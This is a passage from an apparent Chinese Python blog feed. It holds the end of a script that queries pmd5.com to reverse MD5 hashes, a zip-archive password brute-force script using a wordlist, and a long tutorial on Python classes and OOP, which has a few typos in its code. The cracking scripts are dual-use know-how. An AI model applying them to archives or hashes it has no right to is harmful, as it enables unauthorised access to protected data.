alt=""></p><p>发现 md5解密 结果 是包含在 <em></em> 标签中</p><pre><code>a = re.compile(&#39;&lt;em&gt;(.*?)&lt;/em&gt;&#39;)result = a.findall(con)list = &#39;\n&#39;.join(result)print list</code></pre><p>4.最后我们 用函数来 弄下，让代码可读性高点</p><pre><code># coding:utf-8import requestsimport reimport sysdef md5(keywd):    url = &#39;http://pmd5.com&#39;    headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0&#39;}    data = {            &#39;__VIEWSTATE&#39;: &#39;/wEPDwUKMTM4NTE3OTkzOWRkP4hmXYtPPhcBjbupZdLOLfmeTK4=&#39;,            &#39;__VIEWSTATEGENERATOR&#39;: &#39;CA0B0334&#39;,            &#39;__EVENTVALIDATION&#39;: &#39;/wEWAwK75ZuyDwLigPTXCQKU9f3vAheUenitfEuJ6eGUVe2GyFzb7HKC&#39;,            &#39;key&#39;: &#39;{}&#39;.format(keywd),            &#39;jiemi&#39;: &#39;MD5解密&#39;        }    r = requests.post(url=url,headers=headers,data=data)    con = r.text    a = re.compile(&#39;&lt;em&gt;(.*?)&lt;/em&gt;&#39;)    result = a.findall(con)    list = &#39;\n&#39;.join(result)    print listif __name__==&#39;__main__&#39;:    try:        keywd = sys.argv[1]        md5(keywd)    except:        print &quot;python md5_pmd5.py $md5&quot;</code></pre><p>好了，今天就到这了，这是我第一次写文章，可能写的不太好，格式也有点问题，后期我会改正的。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zip密码暴力破解-python</title>
    <link href="/2019/08/19/Python/zip%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/2019/08/19/Python/zip%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>昨天我把zip压缩包的密码给忘记了<br>试了n多个还是不对，把我气得<br>今早直接写了一个 py脚本</p><p>好了，不扯淡了，开始吧</p><h2 id="Code篇"><a href="#Code篇" class="headerlink" title="Code篇"></a>Code篇</h2><p>思路:<br>1.zipfile模块下的 .extractall方法 和 .open 方法都有密码模块,测试了一下,如果密码错误报错<code>Bad password for file</code><br>所以我们可以利用这个报错，正确就打印正确密码，错误就跳过。<br>2.加载字典来进行密码爆破<br>3.然后利用 sys 模块来自定义参数</p><a id="more"></a><p>1.利用zipfile模块的.extractall 和 pwd来进行密码爆破</p><pre><code class="python"># coding:utf-8import zipfile#1.zip 为加密文件#pwd.txt 为密码字典zip = zipfile.ZipFile(&#39;1.zip&#39;, &#39;r&#39;)password = open(&#39;pwd.txt&#39;)for i in password:    pwd = i.strip(&#39;\n&#39;)    try:        zip.extractall(pwd=pwd)        print pwd        zip.close()    except Exception as e:        pass</code></pre><p>这里还是提供下<code>.extractall</code>密码错误的报错吧<br><img src="/images/Python/zip%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.png" srcset="/img/loading.gif" alt=""></p><p>2.提高代码美观。。。和自定义参数</p><pre><code class="python"># coding:utf-8import zipfileimport sysdef get_pwd(pwd):    try:        zip.extractall(pwd=pwd)        print pwd        zip.close()    except Exception as e:        passif __name__ == &#39;__main__&#39;:    try:        zip = zipfile.ZipFile(sys.argv[1], &#39;r&#39;)        password = open(sys.argv[2])        for i in password:            pwd = i.strip(&#39;\n&#39;)            get_pwd(pwd)    except:        print u&quot;python zip.py 压缩文件名 需要加载的字典&quot;        print &quot;python zip.py 1.zip pwd.txt&quot;</code></pre><p>3.没有输入参数的提示和运行结果<br><img src="/images/Python/zip%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.png" srcset="/img/loading.gif" alt=""><br><img src="/images/Python/zip%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/0.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python基础之面向对象</title>
    <link href="/2019/08/19/Python/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    <url>/2019/08/19/Python/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-初识类"><a href="#0x00-初识类" class="headerlink" title="0x00 初识类"></a>0x00 初识类</h1><p><code>python中一切皆对象</code></p><h2 id="创建类"><a href="#创建类" class="headerlink" title="创建类"></a>创建类</h2><pre><code class="python">&#39;&#39;&#39;class 类名:    &#39;类的文档&#39;    类体&#39;&#39;&#39;class Data:    pass</code></pre><p>关键字：<code>class</code></p><a id="more"></a><h2 id="访问属性"><a href="#访问属性" class="headerlink" title="访问属性"></a>访问属性</h2><p>格式：<code>类名.属性</code></p><p>类名的作用：操作属性，查看属性</p><pre><code class="python">#（注：这只是示范，实际操作请勿使用中文）class Data:    属性 = &#39;a&#39;print(Data.a)</code></pre><h2 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h2><p>格式：<code>对象名 = 类名(参数)</code></p><p><code>类名()</code>就是实例化，会自动触动<code>__init__</code>函数的运行，可以用类为每个实例定制自己的特征</p><pre><code class="python">class Person:    def __init__(self,*args):        self.name = args[0]        self.age = args[1]        self.heg = args[2]alex = Person(&#39;Psycho&#39;,0,&#39;???&#39;)print(alex.name)----------------------------------&#39;&#39;&#39;对象 = 类名()过程：    类名() 会创造出一个对象，创建一个self变量    调用__inti__方法，类名()里面的参数会被这里接收    执行__init__方法    返回self&#39;&#39;&#39;</code></pre><h2 id="实例化方法"><a href="#实例化方法" class="headerlink" title="实例化方法"></a>实例化方法</h2><p>格式：<code>类名.方法名(对象名)</code></p><pre><code class="python">class Person:    def __init__(self,*args):        self.name = args[0]        self.age = args[1]        self.heg = args[2]    def walk(self):        print(&#39;%s&#39;%self.name)alex = Person(&#39;Psycho&#39;,0,&#39;???&#39;)print(alex.name)Person.walk(alex)</code></pre><h2 id="init-方法"><a href="#init-方法" class="headerlink" title="__init__方法"></a><code>__init__</code>方法</h2><p>这个方法一般用于初始化类<br>但是，当实例化一个类的时候，并不是第一个被调用的，第一个被调用的是<code>__new__</code></p><blockquote><p>Tips：对当前对象的实例的一些初始化，没有返回值</p></blockquote><p>设置对象的初始属性：<code>self.属性 = 形参</code></p><p>在创建对象时，使用<code>类名(属性1，属性2...)</code>进行调用</p><pre><code class="python">class Person:    def __init__(self,name,age):        self.name = name        self.age = ageinfo = Person(&#39;alex&#39;,&#39;22&#39;)</code></pre><h3 id="self"><a href="#self" class="headerlink" title="self"></a>self</h3><p><strong>init</strong>方法的第一参数永远是self，表示创建类的实例化本身<br>因此，在<strong>init</strong>方法内部，就可以把各种属性绑定到self</p><p><code>self.name</code>：表示某类的属性变量</p><blockquote><p>self.name = name 就是把外部传来的参数name赋值给某类自己的属性变量</p></blockquote><h2 id="类属性"><a href="#类属性" class="headerlink" title="类属性"></a>类属性</h2><pre><code class="python">类的属性存储地址：dir(类名)类名.__dict__：查出的是一个字典，key为属性名，value为属性值---------------------类名.__name__# 类的名字(字符串)类名.__doc__# 类的文档字符串类名.__base__# 类的第一个父类类名.__bases__# 类所有父类构成的元组类名.__dict__# 类的字典属性类名.__module__# 类定义所在的模块类名.__class__# 实例对应的类(仅新式类中)</code></pre><h2 id="其他内置方法"><a href="#其他内置方法" class="headerlink" title="其他内置方法"></a>其他内置方法</h2><h3 id="str"><a href="#str" class="headerlink" title="__str__"></a><code>__str__</code></h3><p>如果直接print(object)打印对象，会看到创建出来的对象在内存中的地址<br>当使用print(object)输出对象的时候，只要对象的类中定义了<code>__str__(self)</code>方法，就会打印该方法<code>return</code>的信息描述</p><pre><code class="python">class Person:    def __str__(self):        return &quot;这是个信息模块&quot;    def __init__(self,name,age):        self.name = name        self.age = ageinfo = Person(&#39;alex&#39;,&#39;22&#39;)print(info)</code></pre><h3 id="del"><a href="#del" class="headerlink" title="__del__"></a><code>__del__</code></h3><p>析构方法，当对象在内存中被释放时，自动触发执行<br>在删除一个对象之前，进行一些收尾工作</p><pre><code class="python">class Person:    def __str__(self):        return &quot;这是个信息模块&quot;    def __init__(self, name, age):        self.name = name        self.age = age    def __del__(self):        print(&#39;关闭对象&#39;)info = Person(&#39;alex&#39;, &#39;22&#39;)</code></pre><h3 id="repr"><a href="#repr" class="headerlink" title="__repr__"></a><code>__repr__</code></h3><p>返回一个可以用来表示对象的可打印字符串<br><code>__repr__</code>是<code>__str__</code>的备胎，但<code>__str__</code>不能做<code>__repr__</code>的备胎<br>如果<code>__str__</code>方法有，那么它返回的必定一个字符串</p><pre><code class="python">class A:    def __init__(self,name,age):        self.name = name        self.age = age    def __repr__(self):        return str(self.__dict__)    # def __str__(self):    #     return &#39;%s,%s&#39;%(self.name,self.age)a = A(&#39;xxx&#39;,20)print(a)</code></pre><blockquote><p> Ps：%r，repr()都是走<code>__repr__</code></p></blockquote><p>与<code>__str__</code>的区别：</p><ol><li><code>__str__()</code>：返回用户看到的字符串</li><li><code>__repr__()</code>：返回程序开发者看到的字符串</li></ol><blockquote><p>内置的方法有很多，不一定全部都在object中</p></blockquote><h3 id="call"><a href="#call" class="headerlink" title="__call__"></a><code>__call__</code></h3><p>一个对象后面加括号，触发执行</p><pre><code class="python">class A:    def __init__(self,name):        pass    def __call__(self):        print(&#39;执行此处&#39;)a = A(&#39;alex&#39;)</code></pre><h3 id="getattr"><a href="#getattr" class="headerlink" title="__getattr__"></a><code>__getattr__</code></h3><p>定义当用户试图获取一个不存在的属性时的行为，适用于对普通拼写错误的获取和重定向，对获取一些不建议的属性时给出警告或者处理一个AttributeError，只有当调用不存在的属性的时候才会被返回</p><pre><code class="pyhton">class Student(object):      def__getattr__(self, attrname):          ifattrname ==&quot;age&quot;:              return40          else:              raiseAttributeError, attrname  x =Student()  print(x.age)       #40  print(x.name)      #error text omitted.....AttributeError, name  </code></pre><h3 id="setattr"><a href="#setattr" class="headerlink" title="__setattr__"></a><code>__setattr__</code></h3><p>是一个封装的解决方案，无论属性是否存在，它都允许你定义对属性的赋值行为，以为这你可以对属性的值进行个性定制，实现<code>__setattr__</code>时要避免”无限递归”错误</p><p>当试图对象的item特性赋值的时候将会被调用</p><pre><code class="python"># -*- coding:utf-8 -*-class Student:    def __getattr__(self, item):        return item + &#39; is not exits&#39;    def __setattr__(self, key, value):        self.__dict__[key] = value    def __getitem__(self, item):        return self.__dict__[item]    def __setitem__(self, key, value):        self.__dict__[key] = values = Student()print(s.name)  # 调用__getattr__方法 输出&#39;name is not exits&#39;s.age = 1  # 调用__setattr__ 方法print(s.age)  # 输出 1print(s[&#39;age&#39;])  # 调用 __getitem__方法 输出1s[&#39;name&#39;] = &#39;tom&#39;  # 调用 __setitem__ 方法print(s[&#39;name&#39;])  # 调用 __getitem__ 方法 输出 &#39;tom&#39;</code></pre><h3 id="delattr"><a href="#delattr" class="headerlink" title="__delattr__"></a><code>__delattr__</code></h3><p>与<code>__setattr__</code>相同，删除一个属性</p><pre><code class="python">class A(object):    def __delattr__(self, *args, **kwargs):          print &#39;call func del attr&#39;          return object.__delattr__(self, *args, **kwargs)  </code></pre><h3 id="getattribute"><a href="#getattribute" class="headerlink" title="__getattribute__"></a><code>__getattribute__</code></h3><p>定义了你的属性被访问时的行为，在支持<code>__getattribute__</code>的python版本，调用<code>__getattr__</code>前必定会调用<code>__getattribute__</code>，不要尝试实现<code>__getattribute__</code></p><p>容易出bug</p><pre><code class="python">class Tree(object):    def __init__(self,name):        self.name = name        self.cate = &quot;plant&quot;    def __getattribute__(self,obj):        print(&quot;哈哈&quot;)        return object.__getattribute__(self,obj)aa = Tree(&quot;大树&quot;)print(aa.name)</code></pre><h3 id="item系列"><a href="#item系列" class="headerlink" title="item系列"></a>item系列</h3><h4 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__"></a><code>__getitem__</code></h4><p>当访问不存在的属性时会调用该方法</p><blockquote><p>可以让对象实现迭代功能，以及p[key]取值</p></blockquote><pre><code class="pyton"># data[&#39;key&#39;]取值class DataTest:    def __init__(self, name,id):        self.name = name        self.id = id    def __getitem__(self, item):        return self.__dict__[item]data = DataTest(&#39;alex&#39;,&#39;1&#39;)print(data[&#39;name&#39;])# 实现迭代功能class DataTest:    def __init__(self, name,id):        self.name = name        self.id = id    def __getitem__(self, item):        return self.name[item]data = DataTest([&#39;alex&#39;,&#39;lie&#39;,&#39;psycho&#39;],&#39;1&#39;)for i in data:    print(i)</code></pre><h4 id="setitem"><a href="#setitem" class="headerlink" title="__setitem__"></a><code>__setitem__</code></h4><p>每当属性被赋值的时候都会调用该方法，因此不能在该方法内（self.name = value）赋值，否则会死循环！</p><pre><code class="python">class DataTest:    def __init__(self, name,id):        self.name = name        self.id = id    def __getitem__(self, item):        return self.__dict__[item]    def __setitem__(self, key, value):        self.__dict__[key]=valuedata = DataTest([&#39;alex&#39;,&#39;lie&#39;,&#39;psycho&#39;],&#39;1&#39;)data[&#39;alex&#39;] = &#39;女&#39;print(data[&#39;alex&#39;])</code></pre><h4 id="delitem"><a href="#delitem" class="headerlink" title="__delitem__"></a><code>__delitem__</code></h4><p>当删除属性时调用该方法</p><pre><code class="python">lass DataTest:    def __init__(self, name,id):        self.name = name        self.id = id    def __getitem__(self, item):        return self.__dict__[item]    def __setitem__(self, key, value):        self.__dict__[key]=value    def __delitem__(self, key):        del self.__dict__[key]data = DataTest([&#39;alex&#39;,&#39;lie&#39;,&#39;psycho&#39;],&#39;1&#39;)data[&#39;alex&#39;] = &#39;女&#39;print(&#39;删除前：%s&#39;%data.__dict__)del data[&#39;alex&#39;]print(&#39;删除后：%s&#39;%data.__dict__)</code></pre><h4 id="new"><a href="#new" class="headerlink" title="__new__"></a><code>__new__</code></h4><p>构造方法：创建一个对象（只负责创建）</p><pre><code class="python">class DataTest:    __instance = False    def __init__(self, name,id):        self.name = name        self.id = id    def __new__(cls, *args, **kwargs):        if cls.__instance:            return cls.__instance        cls.__instance = object.__new__(cls)        return cls.__instancedata = DataTest(&#39;alex&#39;,&#39;1&#39;)nas = DataTest(&#39;nice&#39;,&#39;2&#39;)print(data)print(nas)</code></pre><h4 id="eq"><a href="#eq" class="headerlink" title="__eq__"></a><code>__eq__</code></h4><p>当判断两个对象是否相等时，触发</p><pre><code class="python">class DataTest:    def __init__(self, name,id):        self.name = name        self.id = id    def __eq__(self, other):        if self.__dict__ == other.__dict__:            return True        else:            return Falsedata = DataTest(&#39;alex&#39;,&#39;1&#39;)nas = DataTest(&#39;nice&#39;,&#39;2&#39;)print(data == nas)</code></pre><h4 id="len"><a href="#len" class="headerlink" title="__len__"></a><code>__len__</code></h4><p><code>返回元素的个数</code><br>如果一个类表现得像一个list，要获取有多少个元素，就得用len()函数，要让len()函数正常工作，类必须提供一个特殊方法len()</p><pre><code class="python">class DataTest:    __instance = False    def __init__(self, name,id):        self.name = name        self.id = id    def __len__(self):        return len(self.name)data = DataTest([&#39;alex&#39;,&#39;nice&#39;],&#39;1&#39;)print(len(data.name))</code></pre><h4 id="hash"><a href="#hash" class="headerlink" title="__hash__"></a><code>__hash__</code></h4><p>如果定义可变对象的类实现了<code>__eq__</code>放阿飞，就不要再实现<code>__hash__</code>方法，否则这个对象的hash值发生变化会导致被放在错误的哈希中</p><pre><code class="python">class DataTest:    def __init__(self):        self.name = &#39;alex&#39;        self.id = &#39;2&#39;    def __hash__(self):        return hash(str(self.name)+str(self.id))a = DataTest()print(hash(a))</code></pre><h2 id="面向对象的三大特性"><a href="#面向对象的三大特性" class="headerlink" title="面向对象的三大特性"></a>面向对象的三大特性</h2><ul><li><code>继承</code>：实现代码重用</li><li><code>多态</code>：不同的对象调用相同方法，产生不同的执行结果</li><li><code>封装</code>：根据职责将属性和方法封装到一个抽象的类中</li></ul><h1 id="0x02-继承"><a href="#0x02-继承" class="headerlink" title="0x02 继承"></a>0x02 继承</h1><p>继承是一种创新类的方式，实现代码的重用，相同的代码不需要重复的编写</p><p><code>继承的传递性</code>：<code>子类</code>拥有<code>父类</code>的所有<code>方法</code>和<code>属性</code>及<code>父类的的父类</code>中<code>封装的所有属性和方法</code></p><blockquote><p>Ps：继承父类的时候，前提条件必须有那个类的存在！</p><p>Ps：如果在自己的类中有该方法，先用自己的，没有再从父类中寻找</p></blockquote><p><strong>1. 继承分为：</strong></p><ul><li>单继承</li><li>多继承</li></ul><p><strong>2. 通过继承创建的新类：</strong></p><ul><li>子类</li><li>派生类</li></ul><p><strong>3. 被继承的类：</strong></p><ul><li>基类</li><li>父类</li><li>超类</li></ul><p><strong>查看继承：</strong><code>__bases__</code></p><h2 id="单继承"><a href="#单继承" class="headerlink" title="单继承"></a>单继承</h2><p>继承的语法：</p><pre><code class="python">class 类名(父类名):        pass</code></pre><p>子类<code>拥有</code>父类的<code>所有方法</code>和<code>属性</code></p><pre><code class="python">class Arm:    def __init__(self,name,aggr,hp):        self.name = name        self.aggr = aggr        self.hp = hpclass Person(Arm):    passclass Dog(Arm):    passjin = Dog(&#39;jin&#39;,500,20)print(jin.name)</code></pre><h2 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h2><p>子类可以拥有多个父类，并且具有所有父类的属性和方法</p><pre><code class="python">class 类名(父类1,父类2...):    pass</code></pre><blockquote><p>多继承中，我们子类的对象调用一个方法，默认是就近原则 经典类中 深度优先 新式类中 广度优先 2.7 新式类和经典类共存，新式类要继承object python3 只有新式类</p></blockquote><pre><code class="python">class ParentClass1: #定义父类    passclass ParentClass2: #定义父类    passclass SubClass1(ParentClass1): #单继承，基类是ParentClass1，派生类是SubClass    passclass SubClass2(ParentClass1,ParentClass2): #python支持多继承，用逗号分隔开多个继承的类    pass</code></pre><blockquote><p>Ps：父类之间存在同名的属性或方法，应该尽量避免使用多继承，容易产生混淆</p></blockquote><h2 id="重用性"><a href="#重用性" class="headerlink" title="重用性"></a>重用性</h2><p>在程序开发的过程中，定义了一个A类与一个B类，但是这两个类的大部分内容都相同 我们可以通过继承的方式，让B类继承A的所有属性，实现代码重用</p><pre><code class="python">class Arm:    def __init__(self,name,aggr,hp):        self.name = name        self.aggr = aggr        self.hp = hpclass Dog(Arm):    passjin = Dog(&#39;jin&#39;,500,20)print(jin.name)</code></pre><h2 id="方法的重写与派生"><a href="#方法的重写与派生" class="headerlink" title="方法的重写与派生"></a>方法的重写与派生</h2><p>当父类的方法实现不能满足子类的需求时，可以对方法进行<code>重写</code></p><p>重写父类的方法有两种情况：</p><ol><li>覆盖父类方法</li><li>对父类方法进行扩展</li></ol><h3 id="覆盖父类"><a href="#覆盖父类" class="headerlink" title="覆盖父类"></a>覆盖父类</h3><p>具体的实现方式，就相当于在子类中定义了一个和父类同名的方法并且实现</p><p>重写之后，在运行时，只会调用子类中重写的方法，而不再会调用父类封装的方法</p><pre><code class="python">class Person:    def __init__(self, name, age):        self.name = name        self.age = age    def ack(self):        print(&#39;wu&#39;)class name(Person):    def ack(self):        print(&#39;%s ackti&#39;%self.name)info = name(&#39;alex&#39;,20)info.ack()print(info.age)</code></pre><h3 id="重写父类方法（扩展）"><a href="#重写父类方法（扩展）" class="headerlink" title="重写父类方法（扩展）"></a>重写父类方法（扩展）</h3><p>在子类执行父类的方法也可以直接用<code>super()</code>方法</p><blockquote><p>super本质：不是单纯找父类，而是根据调用者的节点位置的广度优先顺序来的</p></blockquote><p>格式：<code>super().父类方法</code></p><pre><code class="python">class Person:    def __init__(self,name,age):        self.name = name        self.age = ageclass Arm(Person):    def __init__(self,name,age,kind):        super().__init__(name,age)        self.kind = kindsex = Arm(&#39;alex&#39;,20,50)print(sex.kind)</code></pre><h3 id="派生属性"><a href="#派生属性" class="headerlink" title="派生属性"></a>派生属性</h3><p><code>派生属性/方法</code>：父类中没有的属性或方法，在子类中出现的</p><p><code>一旦重新定义了自己的属性且父类重名，那么调用新的属性时，就以自己为准</code></p><pre><code class="python">class Person:    def __init__(self,name,age):        self.name = name        self.age = ageclass Arm(Person):    def __init__(self,name,age,kind):        Person.__init__(self,name,age)        self.kind = kindsex = Arm(&#39;alex&#39;,50,20)print(sex.kind)</code></pre><p>只要是子类的对象调用，子类中有的名字一定用子类的，子类中没有才找父类的</p><p>如果父类也没有 报错</p><p>如果父类 子类都有，用子类的，<code>如果还想用父类的，需要单独调用父类的，需要自己传self参数</code></p><pre><code class="python">class Arm:    def __init__(self,name,aggr,hp):        self.name = name        self.aggr = aggr        self.hp = hp    def eat(self):        print(&#39;吃药回血&#39;)        self.hp += 100class Dog(Arm):    def __init__(self,name,aggr,hp,kind):        Arm.__init__(self,name,aggr,hp)        self.kind = kind    def eat(self):        Arm.eat(self)        self.Thear = 2    def bite(self,person):        person.hp -= self.aggrclass Person(Arm):    def __init__(self,name,aggr,hp,sex):        Arm.__init__(self,name,aggr,hp)        self.sex = sex        self.money = 0    def attack(self,dog):        dog.hp -= self.aggr    def get_weapon(self,weapon):        if self.money &gt;= weapon.price:            self.money -= weapon.price            self.weapon = weapon            self.aggr += weapon.aggr        else:            print(&quot;余额不足，请充值&quot;)jin = Dog(&#39;jin&#39;,500,20,10)jin.eat()</code></pre><h2 id="MRO（方法搜索顺序）"><a href="#MRO（方法搜索顺序）" class="headerlink" title="MRO（方法搜索顺序）"></a>MRO（方法搜索顺序）</h2><p>python针对类提供的一个内置属性，可以查看方法的搜索顺序</p><p>主要用于在多继承时判断，方法，属性的调用路径</p><p>从左到右的顺序查找，在当前类中找到方法就执行，不再搜索</p><p>没有找到，继续查找下一个类</p><p>最终没找到，报错</p><pre><code class="python">class Person:    def __init__(self,name,age):        self.name = name        self.age = ageclass Arm(Person):    def __init__(self,name,age,kind):        super().__init__(name,age)        self.kind = kindprint(Arm.__mro__)</code></pre><h1 id="0x03-封装"><a href="#0x03-封装" class="headerlink" title="0x03 封装"></a>0x03 封装</h1><p>广义上的面向对象封装：代码的保护，面向对象的思想本身就是一种，只让自己的对象能调用自己类中的方法</p><p>狭义封装：面向对象的三大特性之一，属性和方法都隐藏起来</p><p>封装的三种方式：</p><ul><li>public（对外公开，不封装）</li><li>protected（对外不公开，对子类公开）</li><li>private（对谁都公开）</li></ul><p>python中一切皆对象</p><p>类是一个特殊的对象 – 类对象，使用一个类可以创建出很多歌对象实例</p><p>处了封装实例的属性和方法外，类对象还可以拥有自己的属性和方法</p><h2 id="类属性-1"><a href="#类属性-1" class="headerlink" title="类属性"></a>类属性</h2><p>给类对象中定义的属性</p><p>通常用来记录与这个类相关的特征</p><p>类属性不会用于记录具体对象的特征</p><p>调用：<code>类名.</code>的方式</p><pre><code class="python"># 计算人数class Person:    count = 0    def __init__(self, name):        self.name = name        Person.count += 1name1 = Person(&#39;alex&#39;)print(Person.count)</code></pre><p><strong>属性的获取机制</strong>：向上查找机制</p><ol><li>首先在对象内部查找对象属性</li><li>没有找到就会向上寻找类属性</li></ol><p><strong>访问类属性有两种方式：</strong></p><ol><li><code>类名.类属性</code></li><li><code>对象.类属性</code>（不推荐）</li></ol><blockquote><p>Ps：如果使用<code>对象.类属性 = 值</code>赋值语句，只会给对象添加一个属性，而不会影响到类属性的值</p></blockquote><h2 id="私有方法和属性"><a href="#私有方法和属性" class="headerlink" title="私有方法和属性"></a>私有方法和属性</h2><p>私有属性和方法是对象的隐私，不对外公开，外界及子类都不能直接访问</p><p>通常用于做一些内部的事情</p><ul><li>对象的私有属性</li><li>类中的私有方法</li><li>类中静态私有属性</li></ul><p>定义私有属性与方法：<code>__</code>属性或方法</p><p>只要在类的内部使用私有属性，就会自动带上<code>__类名</code></p><blockquote><p>Ps：所有的私有，都不能在类的外部使用</p></blockquote><p>在外部调用的方法：<code>对象._类名__属性</code>（不推荐使用，仅供了解）</p><pre><code class="python">class Person:    __manger = &#39;admin&#39; # 静态私有属性    def __init__(self,username,passwod):        self.username = username        self.__password = passwod # 私有属性    def __mange(self): # 私有方法        print(&quot;管理员登录&quot;)    def login(self):        if self.__password != self.username:            return (&quot;请输入正确的账号密码&quot;)        else:            if self.username == self.__manger:                return self.__mange()            else:                return (&quot;登录成功&quot;)username = &#39;admin&#39;password = &#39;admin&#39;win = Person(username,password)login = win.login()print(login)</code></pre><h2 id="property"><a href="#property" class="headerlink" title="property"></a>property</h2><p>内部装饰器，在面向对象中使用</p><p>把方法<code>伪装成属性</code>：<code>@property</code></p><blockquote><p>Ps：装饰器中不能跟任何参数</p></blockquote><pre><code class="python">class Person:    def __init__(self,name):        self.name = name    @property    def work(self):        return &#39;111&#39;x = Person(&#39;admin&#39;)print(x.work)</code></pre><p>修改<code>@property</code>伪装的方法</p><blockquote><p>Ps：现有<code>@property</code>再有<code>@方法名.setter</code>，再创建一个一样的方法</p></blockquote><p><code>@方法名.setter</code>：把被装饰的方法变成属性来赋值</p><pre><code class="python"># 例子1class Person:    def __init__(self, name):        self.__name = name    @property    def name(self):        return self.__name    @name.setter    def name(self, new_name):        self.__name = new_nametiger = Person(&#39;nice&#39;)print(tiger.name)tiger.name = &#39;fuck&#39;print(tiger.name)#################################################### 例子2class Person:    def __init__(self, name):        self.__name = name    @property    def name(self):        return self.__name    @name.deleter    def name(self):        del self.__nametiger = Person(&#39;nice&#39;)print(tiger.name)del tiger.nameprint(tiger.name)# deleter和del互相关联了</code></pre><h2 id="classmethod"><a href="#classmethod" class="headerlink" title="classmethod"></a>classmethod</h2><p><code>method</code>：方法</p><p><code>classmethod</code>：类方法</p><blockquote><p>Ps：把一个方法，变成一个类中的方法，这个方法就直接可以被类调用，不需要依托任何对象</p></blockquote><p>当这个方法的操作只涉及静态属性的时候，就应该使用<code>classmethod</code>来装饰这个方法</p><p>对应的方法不需要实例化，不用self参数，当<code>第一个参数需要是表示自身类的cls参数</code>，可以来调用类的属性和方法及实例化对象等</p><p>调用：<code>类名.方法</code>，也可以通过cls访问类的属性和其他的类方法</p><pre><code class="python">@classmethoddef 类方法名(cls):    pass</code></pre><pre><code class="python"># 例子class Person:    __discount = 0.8    def __init__(self,price):        self.__price = price    @property    def price(self):        return self.__price * Person.__discount    @classmethod    def price_discount(cls,new_discount):        cls.__discount = new_discountapple = Person(5)print(apple.price)Person.price_discount(1)print(apple.price)</code></pre><h2 id="staticmethod"><a href="#staticmethod" class="headerlink" title="staticmethod"></a>staticmethod</h2><p><code>staticmethod</code>：静态方法</p><p>在完全面向对象的程序中，如果一个函数，即和对象没有关系，也和类没有关系，就将一个函数变成一个静态方法</p><p>调用：<code>类名.方法</code></p><pre><code class="python">@staticmethoddef 静态方法名():    pass</code></pre><pre><code class="python">class Login:    def __init__(self,username,password):        self.__username = username        self.__password = password    def login(self):        pass    @staticmethod    def get_input():        user = input(&#39;username：&#39;)        pwd = input(&#39;password：&#39;)        Login(user,pwd)Login.get_input()</code></pre><blockquote><p>Ps：类方法和静态方法 都是类调用的<br>对象可以调用类方法和静态方法，一般情况下，推荐用类名调用<br>类方法 有一个默认参数 cls代表这个类</p></blockquote><h1 id="0x04-多态"><a href="#0x04-多态" class="headerlink" title="0x04 多态"></a>0x04 多态</h1><p>python天生支持多态，多态指的是同一种事物的多种状态</p><p>多态不同的子类对象调用相同的父类方法，产生不同的执行结果</p><ul><li>增加代码的灵活度</li><li>以继承和重写父类方法为前提</li><li>是调用方法的技巧，不会影响到类的内部设计</li></ul><h1 id="0x05-组合"><a href="#0x05-组合" class="headerlink" title="0x05 组合"></a>0x05 组合</h1><p>一个对象的属性值是另一个类的对象</p><p>在一个类中以另外一个类的对象作为数据属性，成为类的组合</p><pre><code class="python"># 例子1class Date:    def __init__(self,year,mon,day):        self.year=year        self.mon=mon        self.day=day    def birth_info(self):        print(&quot;The birth is %s-%s-%s&quot;%(self.year,self.mon,self.day))class People:    def __init__(self,name,age,year,mon,day):        self.name=name        self.age=age        self.birth=Date(year,mon,day)    def walk(self):        print(&quot;%s is walking&quot;%self.name)class Teacher(People):    def __init__(self,name,age,year,mon,day,course):        People.__init__(self,name,age,year,mon,day)        self.course=course    def teach(self):        print(&quot;%s is teaching&quot;%self.name)class Student(People):    def __init__(self,name,age,year,mon,day,group):        People.__init__(self,name,age,year,mon,day)        self.group=group    def study(self):        print(&quot;%s is studying&quot;%self.name)t1=Teacher(&quot;alex&quot;,28,1989,9,2,&quot;python&quot;)s1=Student(&quot;jack&quot;,22,1995,2,8,&quot;group2&quot;)print(t1.birth.birth_info())</code></pre><pre><code class="python"># 例子2class BirthDate:    def __init__(self,year,month,day):        self.year=year        self.month=month        self.day=dayclass Couse:    def __init__(self,name,price,period):        self.name=name        self.price=price        self.period=periodclass Teacher:    def __init__(self,name,gender,birth,course):        self.name=name         self.gender=gender        self.birth=birth        self.course=course    def teach(self):         print(&#39;teaching&#39;)p1=Teacher(&#39;egon&#39;,&#39;male&#39;,             BirthDate(&#39;1995&#39;,&#39;1&#39;,&#39;27&#39;),             Couse(&#39;python&#39;,&#39;28000&#39;,&#39;4 months&#39;)           ) print(p1.birth.year,p1.birth.month,p1.birth.day) print(p1.course.name,p1.course.price,p1.course.period)&#39;&#39;&#39; 运行结果: 1 27 python 28000 4 months &#39;&#39;&#39;</code></pre><h1 id="0x06-单例设计模式"><a href="#0x06-单例设计模式" class="headerlink" title="0x06 单例设计模式"></a>0x06 